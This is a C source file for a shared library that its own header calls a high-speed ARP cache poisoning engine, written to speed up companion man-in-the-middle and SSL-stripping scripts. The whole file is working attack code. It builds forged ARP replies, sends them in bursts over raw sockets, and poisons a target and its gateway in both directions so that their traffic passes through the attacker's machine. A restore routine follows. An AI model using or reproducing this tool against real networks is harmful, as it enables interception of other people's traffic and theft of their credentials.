/**
 * arp_spoof.c - High-speed ARP cache poisoning engine
 *
 * Constructs and injects ARP reply packets via raw Ethernet sockets
 * for efficient ARP cache poisoning. Replaces per-packet scapy
 * send() calls in mitm.py and ssl_strip.py.
 *
 * Linux-only. Requires CAP_NET_RAW or root privileges.
 * No external dependencies beyond libc and Linux headers.
 *
 * Compile: gcc -std=c11 -shared -fPIC -o libarp_spoof.so arp_spoof.c
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#include "arp_spoof.h"

/* ==================== ARP Frame Constants ==================== */

/* ARP hardware type: Ethernet (1) */
#define ARP_HTYPE_ETHERNET  0x0001
/* ARP protocol type: IPv4 (0x0800) */
#define ARP_PTYPE_IPV4      0x0800
/* ARP hardware address length: 6 (MAC) */
#define ARP_HLEN            6
/* ARP protocol address length: 4 (IPv4) */
#define ARP_PLEN            4
/* ARP operation: Reply (2) */
#define ARP_OP_REPLY        0x0002
/* ARP operation: Request (1) */
#define ARP_OP_REQUEST      0x0001

/* Ethernet header size: 14 bytes (dst[6] + src[6] + type[2]) */
#define ETH_HDR_SIZE        14
/* ARP payload size: 28 bytes */
#define ARP_PAYLOAD_SIZE    28
/* Total ARP frame size: Ethernet(14) + ARP(28) = 42 bytes */
#define ARP_FRAME_SIZE      42

/* EtherType for ARP: 0x0806 */
#define ETHERTYPE_ARP       0x0806

/* Broadcast MAC address */
static const uint8_t BROADCAST_MAC[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

/* ==================== Internal Helpers ==================== */

/**
 * Build an ARP frame (Ethernet header + ARP payload).
 *
 * Frame layout:
 *   [6]  Ethernet Destination MAC
 *   [6]  Ethernet Source MAC
 *   [2]  EtherType (0x0806 = ARP)
 *   [2]  Hardware Type (0x0001 = Ethernet)
 *   [2]  Protocol Type (0x0800 = IPv4)
 *   [1]  Hardware Address Length (6)
 *   [1]  Protocol Address Length (4)
 *   [2]  Operation (1=request, 2=reply)
 *   [6]  Sender Hardware Address (MAC)
 *   [4]  Sender Protocol Address (IP)
 *   [6]  Target Hardware Address (MAC)
 *   [4]  Target Protocol Address (IP)
 *   Total: 42 bytes
 */
static size_t build_arp_frame(uint8_t *buf,
                              const uint8_t *eth_dst, const uint8_t *eth_src,
                              uint16_t operation,
                              const uint8_t *sender_mac, const uint8_t *sender_ip,
                              const uint8_t *target_mac, const uint8_t *target_ip)
{
    size_t offset = 0;

    /* Ethernet header */
    memcpy(buf + offset, eth_dst, 6);
    offset += 6;
    memcpy(buf + offset, eth_src, 6);
    offset += 6;
    /* EtherType: ARP (big-endian) */
    buf[offset++] = (uint8_t)(ETHERTYPE_ARP >> 8);
    buf[offset++] = (uint8_t)(ETHERTYPE_ARP & 0xFF);

    /* ARP header */
    /* Hardware type: Ethernet (big-endian) */
    buf[offset++] = (uint8_t)(ARP_HTYPE_ETHERNET >> 8);
    buf[offset++] = (uint8_t)(ARP_HTYPE_ETHERNET & 0xFF);
    /* Protocol type: IPv4 (big-endian) */
    buf[offset++] = (uint8_t)(ARP_PTYPE_IPV4 >> 8);
    buf[offset++] = (uint8_t)(ARP_PTYPE_IPV4 & 0xFF);
    /* Hardware address length */
    buf[offset++] = ARP_HLEN;
    /* Protocol address length */
    buf[offset++] = ARP_PLEN;
    /* Operation (big-endian) */
    buf[offset++] = (uint8_t)(operation >> 8);
    buf[offset++] = (uint8_t)(operation & 0xFF);

    /* Sender hardware address (MAC) */
    memcpy(buf + offset, sender_mac, 6);
    offset += 6;
    /* Sender protocol address (IP) */
    memcpy(buf + offset, sender_ip, 4);
    offset += 4;
    /* Target hardware address (MAC) */
    memcpy(buf + offset, target_mac, 6);
    offset += 6;
    /* Target protocol address (IP) */
    memcpy(buf + offset, target_ip, 4);
    offset += 4;

    return offset; /* Should always be 42 */
}

/* ==================== Public API ==================== */

__attribute__((visibility("default")))
size_t build_arp_reply(uint8_t *buf, size_t buf_size,
                       const uint8_t *src_mac, const uint8_t *src_ip,
                       const uint8_t *dst_mac, const uint8_t *dst_ip)
{
    if (!buf || !src_mac || !src_ip || !dst_mac || !dst_ip) {
        errno = EINVAL;
        return 0;
    }
    if (buf_size < ARP_FRAME_SIZE) {
        errno = ENOBUFS;
        return 0;
    }

    return build_arp_frame(buf, dst_mac, src_mac, ARP_OP_REPLY,
                           src_mac, src_ip, dst_mac, dst_ip);
}

__attribute__((visibility("default")))
size_t build_arp_gratuitous(uint8_t *buf, size_t buf_size,
                            const uint8_t *src_mac, const uint8_t *src_ip)
{
    static const uint8_t zero_mac[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

    if (!buf || !src_mac || !src_ip) {
        errno = EINVAL;
        return 0;
    }
    if (buf_size < ARP_FRAME_SIZE) {
        errno = ENOBUFS;
        return 0;
    }

    /* Gratuitous ARP: broadcast, sender=target IP, target MAC=00:00:00:00:00:00 */
    return build_arp_frame(buf, BROADCAST_MAC, src_mac, ARP_OP_REPLY,
                           src_mac, src_ip, zero_mac, src_ip);
}

__attribute__((visibility("default")))
int arp_open_socket(const char *iface)
{
    int sock_fd;
    struct ifreq ifr;
    struct sockaddr_ll sll;

    if (!iface || strlen(iface) == 0) {
        errno = EINVAL;
        return -1;
    }

    /* Create raw socket for Ethernet frames */
    sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock_fd < 0) {
        return -1;
    }

    /* Get interface index */
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sock_fd, SIOCGIFINDEX, &ifr) < 0) {
        int saved = errno;
        close(sock_fd);
        errno = saved;
        return -1;
    }

    /* Bind to interface */
    memset(&sll, 0, sizeof(sll));
    sll.sll_family   = AF_PACKET;
    sll.sll_ifindex  = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ARP);

    if (bind(sock_fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        int saved = errno;
        close(sock_fd);
        errno = saved;
        return -1;
    }

    return sock_fd;
}

__attribute__((visibility("default")))
void arp_close_socket(int sock_fd)
{
    if (sock_fd >= 0) {
        close(sock_fd);
    }
}

__attribute__((visibility("default")))
int arp_poison_burst(int sock_fd,
                     const uint8_t *src_mac, const uint8_t *src_ip,
                     const uint8_t *dst_mac, const uint8_t *dst_ip,
                     int count, int delay_us)
{
    uint8_t frame[ARP_FRAME_SIZE];
    int sent = 0;

    if (sock_fd < 0 || !src_mac || !src_ip || !dst_mac || !dst_ip || count <= 0) {
        errno = EINVAL;
        return -1;
    }

    /* Build the ARP reply frame once */
    size_t frame_len = build_arp_reply(frame, sizeof(frame),
                                       src_mac, src_ip, dst_mac, dst_ip);
    if (frame_len == 0) {
        return -1;
    }

    /* Send burst */
    for (int i = 0; i < count; i++) {
        ssize_t ret = write(sock_fd, frame, frame_len);
        if (ret < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                continue;
            }
            return sent > 0 ? sent : -1;
        }
        sent++;

        if (delay_us > 0 && i < count - 1) {
            usleep((unsigned int)delay_us);
        }
    }

    return sent;
}

__attribute__((visibility("default")))
int arp_poison_bidirectional(int sock_fd,
                             const uint8_t *attacker_mac,
                             const uint8_t *target_mac, const uint8_t *target_ip,
                             const uint8_t *gateway_mac, const uint8_t *gateway_ip,
                             int count, int delay_us)
{
    int total_sent = 0;

    if (sock_fd < 0 || !attacker_mac || !target_mac || !target_ip ||
        !gateway_mac || !gateway_ip || count <= 0) {
        errno = EINVAL;
        return -1;
    }

    for (int i = 0; i < count; i++) {
        /* Tell target: gateway_ip is at attacker_mac */
        uint8_t frame1[ARP_FRAME_SIZE];
        size_t len1 = build_arp_reply(frame1, sizeof(frame1),
                                      attacker_mac, gateway_ip,
                                      target_mac, target_ip);
        if (len1 > 0) {
            if (write(sock_fd, frame1, len1) > 0) {
                total_sent++;
            }
        }

        /* Tell gateway: target_ip is at attacker_mac */
        uint8_t frame2[ARP_FRAME_SIZE];
        size_t len2 = build_arp_reply(frame2, sizeof(frame2),
                                      attacker_mac, target_ip,
                                      gateway_mac, gateway_ip);
        if (len2 > 0) {
            if (write(sock_fd, frame2, len2) > 0) {
                total_sent++;
            }
        }

        if (delay_us > 0 && i < count - 1) {
            usleep((unsigned int)delay_us);
        }
    }

    return total_sent;
}

__attribute__((visibility("default")))
int arp_restore(int sock_fd,
                const uint8_t *target_mac, const uint8_t *target_ip,
                const uint8_t *gateway_mac, const uint8_t *gateway_ip,
                int count)
{
    int total_sent = 0;

    if (sock_fd < 0 || !target_mac || !target_ip ||
        !gateway_mac || !gateway_ip || count <= 0) {
        errno = EINVAL;
        return -1;
    }

    for (int i = 0; i < count; i++) {
        /* Tell target: gateway_ip is at gateway_mac (correct) */
        uint8_t frame1[ARP_FRAME_SIZE];
        size_t len1 = build_arp_reply(frame1, sizeof(frame1),
                                      gateway_mac, gateway_ip,
                                      target_mac, target_ip);
        if (len1 > 0) {
            if (write(sock_fd, frame1, len1) > 0) {
                total_sent++;
            }
        }

        /* Tell gateway: target_ip is at target_mac (correct) */
        uint8_t frame2[ARP_FRAME_SIZE];
        size_t len2 = build_arp_reply(frame2, sizeof(frame2),
                                      target_mac, target_ip,
                                      gateway_mac, gateway_ip);
        if (len2 > 0) {
            if (write(sock_fd, frame2, len2) > 0) {
                total_sent++;
            }
        }

        usleep(10000); /* 10ms between restore packets */
    }

    return total_sent;
}
